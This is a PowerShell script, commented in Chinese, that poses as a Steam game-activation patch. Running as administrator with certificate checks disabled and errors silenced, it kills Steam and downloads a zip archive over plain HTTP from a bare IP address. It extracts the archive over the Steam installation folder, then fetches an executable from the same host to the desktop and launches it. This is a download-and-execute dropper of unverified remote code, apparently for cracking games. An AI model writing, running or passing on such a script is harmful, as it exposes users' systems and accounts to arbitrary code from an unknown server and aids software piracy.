#Requires -RunAsAdministrator
chcp 65001 > $null
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

# ========== 全局TLS兼容 ==========
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls12
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# ========== 配置区 ==========
$ZipUrl = "http://47.100.104.45/files/patch.zip"
$ActivatorUrl = "http://47.100.104.45/files/游戏激活程序.exe"
$TempZip = "$env:TEMP\steam_patch.zip"
$TempUnzip = "$env:TEMP\steam_patch_temp"
$Desktop = [Environment]::GetFolderPath("Desktop")
$ActivatorExeName = "游戏激活程序.exe"
# ============================

# ===== 补丁安装逻辑 =====
$SteamRoot = $null
if(Test-Path "HKCU:\Software\Valve\Steam"){
    $regInfo = Get-ItemProperty "HKCU:\Software\Valve\Steam"
    if($regInfo.SteamPath -and (Test-Path "$($regInfo.SteamPath)\steam.exe")){
        $SteamRoot = $regInfo.SteamPath.TrimEnd('\')
    }
}
if(-not $SteamRoot){
    if(Test-Path "HKLM:\SOFTWARE\Wow6432Node\Valve\Steam"){
        $regInfo = Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Valve\Steam"
        if($regInfo.InstallPath -and (Test-Path "$($regInfo.InstallPath)\steam.exe")){
            $SteamRoot = $regInfo.InstallPath.TrimEnd('\')
        }
    }
}
if(-not $SteamRoot){
    $diskArr = @("C:","D:","E:","F:")
    foreach($disk in $diskArr){
        $path1 = "$disk\Program Files (x86)\Steam"
        if(Test-Path "$path1\steam.exe"){
            $SteamRoot = $path1
            break
        }
        $path2 = "$disk\Steam"
        if(Test-Path "$path2\steam.exe"){
            $SteamRoot = $path2
            break
        }
    }
}
if(-not $SteamRoot){
    $steamProc = Get-Process steam -ErrorAction SilentlyContinue
    if($steamProc){
        $exePath = $steamProc[0].Path
        $SteamRoot = Split-Path $exePath -Parent
    }
}
if(-not $SteamRoot -or -not (Test-Path "$SteamRoot\steam.exe")){
    Write-Host "`n❌ ERROR: Cannot locate Steam folder" -ForegroundColor Red
    Start-Sleep 5
    exit 1
}

# ========== 停止 Steam 进程并等待 ==========
Get-Process steam,steamwebhelper,steamerrorreporter -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 3
# =========================================================================

try{
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($ZipUrl,$TempZip)
}catch{
    Write-Host "`n❌ ERROR: Patch download failed" -ForegroundColor Red
    Start-Sleep 5
    exit 1
}

if(Test-Path $TempUnzip){Remove-Item $TempUnzip -Recurse -Force}
New-Item $TempUnzip -ItemType Directory -Force | Out-Null
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($TempZip,$TempUnzip)

robocopy "$TempUnzip" "$SteamRoot" /E /IS /R:0 /W:0 /NP /NFL /NDL > $null 2>&1

# ===== 强制删除 steam.cfg 和 hid.dll =====
$cfgFullPath = Join-Path $SteamRoot "steam.cfg"
if (Test-Path $cfgFullPath) {
    Remove-Item -Path $cfgFullPath -Force
}

$hidFullPath = Join-Path $SteamRoot "hid.dll"
if (Test-Path $hidFullPath) {
    Remove-Item -Path $hidFullPath -Force -ErrorAction SilentlyContinue
}
# =========================================================================

Remove-Item $TempZip -Force
Remove-Item $TempUnzip -Recurse -Force

Write-Host "`n=====================================" -ForegroundColor Cyan
Write-Host "✅ SUCCESS: All patches installed" -ForegroundColor Green
Write-Host "=====================================`n" -ForegroundColor Cyan

# ========== 下载最新版激活程序到桌面 ==========
$activatorExePath = Join-Path $Desktop $ActivatorExeName
try {
    $webClient.DownloadFile($ActivatorUrl, $activatorExePath)
    Write-Host "✅ 游戏激活程序.exe 已成功下载到桌面" -ForegroundColor Green
} catch {
    try {
        Invoke-WebRequest -Uri $ActivatorUrl -OutFile $activatorExePath -UseBasicParsing -ErrorAction Stop
    } catch {
        Write-Host "❌ ERROR: 激活工具下载失败，请检查网络。" -ForegroundColor Red
        Start-Sleep 3
    }
}

# ========== 【新增】：自定义美观的“请手动打开 Steam”弹窗 ==========
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

try {
    $defFont = New-Object System.Drawing.Font("Microsoft YaHei", 10)
    $titleFont = New-Object System.Drawing.Font("Microsoft YaHei", 14, [System.Drawing.FontStyle]::Bold)
} catch {
    $defFont = [System.Drawing.SystemFonts]::DefaultFont
    $titleFont = New-Object System.Drawing.Font($defFont.FontFamily, 14, [System.Drawing.FontStyle]::Bold)
}

$formPrompt = New-Object System.Windows.Forms.Form
$formPrompt.Text = "激活提示"
$formPrompt.Size = New-Object System.Drawing.Size(460, 200)
$formPrompt.StartPosition = "CenterScreen"
$formPrompt.BackColor = [System.Drawing.Color]::FromArgb(32, 38, 48)
$formPrompt.ForeColor = [System.Drawing.Color]::White
$formPrompt.FormBorderStyle = "None"
$formPrompt.TopMost = $true

$lblPrompt = New-Object System.Windows.Forms.Label
$lblPrompt.Text = "激活完成，请手动打开 Steam 后输入激活码"
$lblPrompt.Font = $titleFont
$lblPrompt.Location = New-Object System.Drawing.Point(35, 45)
$lblPrompt.Size = New-Object System.Drawing.Size(400, 30)
$lblPrompt.ForeColor = [System.Drawing.Color]::FromArgb(255, 255, 255)
$formPrompt.Controls.Add($lblPrompt)

$btnPromptPanel = New-Object System.Windows.Forms.Panel
$btnPromptPanel.Dock = "Bottom"
$btnPromptPanel.Height = 50
$btnPromptPanel.BackColor = [System.Drawing.Color]::FromArgb(62, 107, 200)
$formPrompt.Controls.Add($btnPromptPanel)

$btnPromptOk = New-Object System.Windows.Forms.Button
$btnPromptOk.Text = "确定"
$btnPromptOk.Size = New-Object System.Drawing.Size(460, 50)
$btnPromptOk.Location = New-Object System.Drawing.Point(0, 0)
$btnPromptOk.BackColor = [System.Drawing.Color]::Transparent
$btnPromptOk.ForeColor = [System.Drawing.Color]::White
$btnPromptOk.FlatStyle = "Flat"
$btnPromptOk.FlatAppearance.BorderSize = 0
$btnPromptOk.Font = New-Object System.Drawing.Font("Microsoft YaHei", 11)
$btnPromptOk.Cursor = "Hand"
$btnPromptOk.Add_MouseEnter({ $btnPromptOk.BackColor = [System.Drawing.Color]::FromArgb(92, 137, 230) })
$btnPromptOk.Add_MouseLeave({ $btnPromptOk.BackColor = [System.Drawing.Color]::Transparent })
$btnPromptOk.Add_Click({ $formPrompt.Close() })
$btnPromptPanel.Controls.Add($btnPromptOk)

$formPrompt.ShowDialog()
# =====================================================================

# ========== 自动弹出激活程序 ==========
if (Test-Path $activatorExePath) {
    Start-Process $activatorExePath
} else {
    Write-Host "⚠️ WARNING: 激活工具不存在，请检查桌面" -ForegroundColor Yellow
}

Start-Sleep -Seconds 5
exit 0